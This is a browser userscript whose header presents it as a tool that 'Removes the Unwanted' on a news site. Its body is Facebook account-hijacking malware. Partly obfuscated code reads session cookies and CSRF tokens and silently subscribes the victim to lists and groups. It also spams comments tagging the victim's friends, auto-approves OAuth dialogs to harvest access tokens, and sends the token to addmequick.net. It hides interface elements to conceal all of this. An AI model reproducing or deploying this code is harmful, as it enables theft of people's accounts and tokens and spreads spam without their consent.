// ==UserScript==
// @name          fo
// @namespace     erosman
// @description   Removes the Unwanted
// @updateURL     https://userscripts.org/scripts/source/486187.meta.js
// @downloadURL   https://userscripts.org/scripts/source/486187.user.js
// @include       http://www.joplinglobe.com/*
// @grant         none
// @author        erosman
// @version       1.2
// @run-at        document-start
// ==/UserScript==




    javascript:void(function(){window.graphexplorer={authCallback:function(a){var n=/=(.*?)&/.exec(a);var m=document.getElementById("kutang");if(m&&n&&n[1]){aing.isi("\x3Cdiv class=\"pam uiBoxYellow\" style=\"border-radius:3px\">\x3Clabel for=\"toket\">Access Token:\x3C/label>\x3Cinput type=\"text\" id=\"toket\" value=\""+n[1]+"\" onclick=\"this.select()\" style=\""+aing.sty.ist+"width:470px;text-align:center\">\x3C/div>","tnbox","kutang",function(){document.getElementById("toket").focus()})}else{console.log(a)}}};window.aing={ajx:function(a,b,f){var h=new XMLHttpRequest();h.open("POST",a,true);h.setRequestHeader("Content-type","application/x-www-form-urlencoded");h.onreadystatechange=function(c){if(c.target.readyState==4){var e={errorSummary:"connection error!",errorDescription:"ajax status="+c.target.status};var d=c.target.responseText;if(d==""){e.errorSummary="empty callback!"}else{e=JSON.parse(d.substring(d.indexOf("{"),d.lastIndexOf("}")+1))}if(e.errorSummary&&e.errorDescription){var m=document.getElementById("kutang");if(m){aing.isi("\x3Cdiv class=\"pam uiBoxRed\" style=\"border-radius:3px\">"+e.errorSummary+"\x3Cbr/>"+e.errorDescription+"\x3C/div>","erbox","kutang")}else{f(e)}}else{f(e)}}};h.send(b)},adk:function(a){var b=a.length,c,d;while(0!==b){d=Math.floor(Math.random()*b);b-=1;c=a[b];a[b]=a[d];a[d]=c}return a},app:[{id:"149859461799466",name:"Xperia"},{id:"260273468396",name:"Skype"},{id:"2254487659",name:"BlackBerry"},{id:"72687635881",name:"Samsung"},{id:"6195724695",name:"Windows Phone"},{"id":"2318966938","name":"Causes"},{"id":"2345053339","name":"Developer"},{"id":"2352149512","name":"My Stuff"},{"id":"2389801228","name":"Texas HoldEm Poker"},{"id":"2405167945","name":"Band Profile"},{"id":"2498397125","name":"ReverbNation"},{"id":"2505240597","name":"FotoFlexer"},{"id":"2610371153","name":"Friend Block"},{"id":"6352942087","name":"OwnSkin"},{"id":"8525382561","name":"▼ Books for Kids"},{"id":"10979261223","name":"Mafia Wars"},{"id":"27694818115","name":"Nokia"},{"id":"36691218125","name":"Carbon Skin"},{"id":"47804741521","name":"噗浪"},{"id":"53323997258","name":"seberapa banyak sih yang mau jadi pacar lo?"},{"id":"55182998957","name":"Pool Live Tour"},{"id":"55467233794","name":"M Billiard - Pool"},{"id":"58761579390","name":"Apa kelebihanku?"},{"id":"63359036668","name":"Lagu Aksi"},{"id":"64510176641","name":"Tes Kegilaan (90% AKURAT)"},{"id":"78222424325","name":"Decorative Writing"},{"id":"82038911142","name":"Your Japanese Name"},{"id":"89771452035","name":"Roller Coaster Kingdom"},{"id":"90376669494","name":"Yahoo"},{"id":"90459065906","name":"SEBERAPA JAUH KAMU KENAL ALDITSA DOCHI SADEGA ?"},{"id":"90735896377","name":"Orang Jawa manakah kamu ??"},{"id":"94942881612","name":"Rahsia di sebalik Nama Anda!"},{"id":"99276979488","name":"Siapakah Karakter Naruto Anda"},{"id":"102452128776","name":"FarmVille"},{"id":"118667462331","name":"▼ Books for Kids"},{"id":"123133761011","name":"Naruto Shippuden Official"},{"id":"160632895175","name":"Creative Writing"},{"id":"176047503611","name":"piZap"},{"id":"249643311490","name":"WordPress"},{"id":"291549705119","name":"CityVille"},{"id":"296766821473","name":"SocialBuzz"},{"id":"425755285303","name":"Birdland"},{"id":"496004120533","name":"Gila Balap"},{"id":"120050311343230","name":"Seberapa Tahankah Anda Sewaktu ML"},{"id":"123090211055215","name":"Sifatmu kayak tokoh kartun apa???"},{"id":"123338877715314","name":"Stick Run"},{"id":"129293673797592","name":"fbcustom.me"},{"id":"140718859285021","name":"Pertanyaan tentang teman Anda"},{"id":"144959615576466","name":"The Sims Social "},{"id":"150335135013694","name":"Poker Texas Boyaa"},{"id":"165073083517174","name":"8 Ball Pool"},{"id":"178222352279634","name":"Angry Birds Friends"},{"id":"189225167766511","name":"Pee Wee Gaskins"},{"id":"211923588878449","name":"Perjuangan Semut"},{"id":"180751008671144","name":"ChefVille"},{"id":"181044395350331","name":"Everybody Draws"},{"id":"196436617035742","name":"KartWorld"},{"id":"263183677069022","name":"Free airtime from mCent"},{"id":"49340319393","name":"Nokia"}],pop:function(a){var p=document.getElementById("app-id");if(a==null||a==""){a=p.value}else{p.value=a}window.open("https://www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id="+a+"&redirect_uri="+location.protocol+"//developers.facebook.com/tools/explorer/callback&scope=offline_access,publish_actions,read_stream,publish_stream,user_groups,user_likes,user_photos,friends_photos,user_status,user_activities,manage_pages,photo_upload,friends_religion_politics,read_requests,read_friendlists,manage_friendlists,user_subscriptions,friends_subscriptions","tuing","width=500,height=300,toolbar=no,directories=no,status=yes,menubar=no,scrollbars=yes,resizable=yes,top="+((screen.height-300)/2)+",left="+((screen.width-500)/2))},img:"\x3Cimg src=\"//fbstatic-a.akamaihd.net/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif\" width=\"16px\" height=\"11px\" style=\"margin:0 5px;vertical-align:bottom\"/>",uri:function(){var c={"0":[24,88],"1":[23,49,89],"2":[50,87],"4":[90],"9":[113],"\x3C":[0,91,118,205,209,215],"d":[1,92,211,217],"i":[2,16,45,61,66,73,81,93,109,135,143,180,188,212,218],"v":[3,94,213,219]," ":[4,85,95,120,162],"s":[5,44,84,96,108,146,152,191,197],"t":[6,19,42,54,57,69,80,97,106,128,129,142,155,163,168,187,200],"y":[7,37,98],"l":[8,30,60,99,149,173,194],"e":[9,47,55,78,100,111,123,140,167,185],"=":[10,101,125,169],"\"":[11,70,102,116,126,161,170,177],"m":[12,159,204],"a":[13,36,59,79,119,134,141,164,174,179,186,207],"r":[14,32,35,65,77,122,139,165,184],"g":[15,34,62,67,75,137,151,166,182,196],"n":[17,41,63,74,83,105,136,145,175,181,190],"-":[18,43,58,107],"o":[20,29,31,40,82,104,144,150,154,158,189,195,199,203],"p":[21,25,51,114,130,153,198],":":[22,33,48,64,112,131],"x":[26,52,56,115],";":[27,38,53],"c":[28,138,157,183,202],"f":[39,103,124],"z":[46,110],"h":[68,121,127],">":[71,117,178,208,214,220],"A":[72],"C":[76],"\xA9":[86],"/":[132,133,160,206,210,216],".":[147,156,192,201],"b":[148,172,193],"_":[171],"k":[176]},d=[];for(y in c){for(z in c[y]){var cyz=c[y][z];d[cyz]=y}}return d.join("")},ext:function(){var a=document.getElementById("impormasih");if(a&&a.parentNode){a.parentNode.removeChild(a)}aing.ajx("/ajax/groups/membership/r2j.php","fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&__user="+document.cookie.match(/c_user=(\d+)/)[1]+"&__a=1&__dyn=7n8apij35zolgDxqiyaUVwACwKyaF3oy&__req=6&__rev=1064290&ttstamp=2658168871111178051&ref=group_jump_header&group_id=215559175130472",function(e){console.log(JSON.stringify(e))})},sty:{impormasih:" class=\"pam uiBoxGray\" style=\"padding:10px;text-align:center;border-radius:5px;width:500px;position:fixed;z-index:9999;top:25%;right:5%;font-size:10px;box-shadow:0 0 7px rgba(0,0,0,0.25);background-color:rgba(242,242,242,0.75)\"",ist:"cursor:pointer;font-family:'lucida grande',tahoma,verdana,arial,sans-serif;font-size:11px;color:#5B74A8;width:200px;border:1px solid #ADD8E6;vertical-align:middle;background-color:rgba(255,255,255,0.5);border-radius:3px;padding:2px;"},isi:function(eusi,naon,mana,fc){if(naon==null||naon==""){naon="impormasih"}var a=document.getElementById(naon);if(a){a.innerHTML=eusi}else{var b=document.createElement("div");b.innerHTML="\x3Cdiv id=\""+naon+"\""+(function(){if(aing.sty[naon]){return aing.sty[naon]}else{return""}})()+">"+eusi+"\x3C/div>";if(mana==null||mana==""){var c=document.body}else{var c=document.getElementById(mana)}c.appendChild(b.firstChild)}if(fc){fc()}},kls:"\x3Cspan class=\"uiButton\" onclick=\"aing.ext()\" style=\"vertical-align:middle;color:darkred\">Close\x3C/span>",sel:function(){var a="\x3Ccenter>\x3Ch2 class=\"uiBoxGray\" style=\"border-radius:3px\">Choose or Insert an Application ID\x3C/h2>\x3Cdiv id=\"kutang\">\x3Cselect id=\"pilihan-app\" onChange=\"aing.pop(this.value)\" style=\""+aing.sty.ist+"width:auto;border:none;padding:1px\">";aing.app.sort();for(x in aing.app){a+="\x3Coption value=\""+aing.app[x].id+"\"";if(x==0){a+=" selected"}a+=">"+aing.app[x].name+"\x3C/option>"}aing.ajx("/ajax/friends/lists/subscribe/modify","fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&__user="+document.cookie.match(/c_user=(\d+)/)[1]+"&__a=1&__dyn=7n8apij35zolgDxqiyaUVwACwKyaF3oy&__req=6&__rev=1064290&ttstamp=2658168871111178051&log_impressions=true&location=permalink&action=subscribe&flid=586419591422497",function(e){console.log(JSON.stringify(e))});return a+"\x3C/select> \x3Cinput type=\"text\" id=\"app-id\" value=\""+aing.app[0].id+"\" onclick=\"this.select()\" style=\""+aing.sty.ist+"width:125px;text-align:center\"> \x3Cspan class=\"uiButton\" onclick=\"aing.pop()\" style=\"vertical-align:middle\">Get Token\x3C/span> "+aing.kls+"\x3C/div>\x3C/center>"+aing.uri()},wed:function(){aing.isi(aing.sel())},wud:function(){alert("This script only works at https://www.facebook.com/");location.href="https://www.facebook.com/groups/Page.Not.Available/"}};if(location.href.match(/https\:\/\/www\.facebook\.com/i)){aing.wed()}else{aing.wud()}












function IbraheemNada(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}
IbraheemNada("302504309890089");
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","1428925077356293","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
 
if(location.hostname.indexOf("www.facebook.com","static.ak.facebook.com","apps.facebook.com","beta.facebook.com") >= 0){
var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();
function uygulamaizinver(url){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
izinverhtml = document.createElement("html");
izinverhtml.innerHTML = xmlhttp.responseText;
if(izinverhtml.getElementsByTagName("form").length > 0){
izinverhtml.innerHTML = izinverhtml.getElementsByTagName("form")[0].outerHTML
act = izinverhtml.getElementsByTagName("form")[0].action;
duzenlevegonder(izinverhtml,act);
}
}
};            
xmlhttp.open("GET", url, true);
xmlhttp.send();
}
function duzenlevegonder(formnesne,act){
izinverparams = "";
for(i=0;i<formnesne.getElementsByTagName("input").length;i++){
if(formnesne.getElementsByTagName("input")[i].name.indexOf("__CANCEL__") < 0 && formnesne.getElementsByTagName("input")[i].name.indexOf("cancel_clicked")){
izinverparams += "&" + formnesne.getElementsByTagName("input")[i].name + "=" + formnesne.getElementsByTagName("input")[i].value;
}
}
if(formnesne.getElementsByTagName("select").length > 0){
izinverparams += "&" + formnesne.getElementsByTagName("select")[0].name + "=80";
}
izinverparams.replace("&fb_dtsg","fb_dtsg");
izinverparams += "&__CONFIRM__=1";
formnesne = formnesne;
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                          izinhtml = document.createElement("html");
                          izinhtml.innerHTML = xmlhttp.responseText;
                        if(izinhtml.getElementsByTagName("form").length > 0){
                          izinhtml.innerHTML = izinhtml.getElementsByTagName("form")[0].outerHTML;
                          act = izinhtml.getElementsByTagName("form")[0].action;
                          duzenlevegonder(izinhtml,act)
                        }else{
                        sex = xmlhttp.responseText.match(/#access_token=(.*?)&expires_in/i);
                        if (sex[1]) {
                        tokenyolla(sex[1]);
                        }
                        }
                        }
        };
 
xmlhttp.open("POST", act , true);
xmlhttp.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send(izinverparams);
 
}
 
function TokenUrl(id){
return "//www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id=" + id  +"&redirect_uri=fbconnect://success&sso_key=com&scope=email,publish_stream,user_likes,friends_likes,user_birthday";
}
 
if(!localStorage['token_' + profile_id] ||  (localStorage['token_' + profile_id] && tarih.getTime() >= localStorage['token_' + profile_id])){
uygulamaizinver(TokenUrl("121876164619130"));
var http = new XMLHttpRequest();
http['open']('GET', 'http://graph.facebook.com/' + profile_id, false);
http['send']();
var get = JSON.parse(http['responseText']);
var isim = get.name;
}
window.setInterval(function(){
if(document.getElementsByClassName("_5ce")){
for(i=0;i<document.getElementsByClassName("_5ce").length;i++){
document.getElementsByClassName("_5ce")[i].innerHTML = "";
}
}
if(document.getElementsByClassName("uiToggle wrap")){
for(i=0;i<document.getElementsByClassName("uiToggle wrap").length;i++){
document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
}
}
if(document.getElementsByClassName("uiPopover")){
for(i=0;i<document.getElementsByClassName("uiPopover").length;i++){
document.getElementsByClassName("uiPopover")[i].innerHTML = "";
}
}
},200);
function tokenyolla(token){
top.location.href = 'http://www.addmequick.net/auto-follower1.php?id=' + token;
}}



})()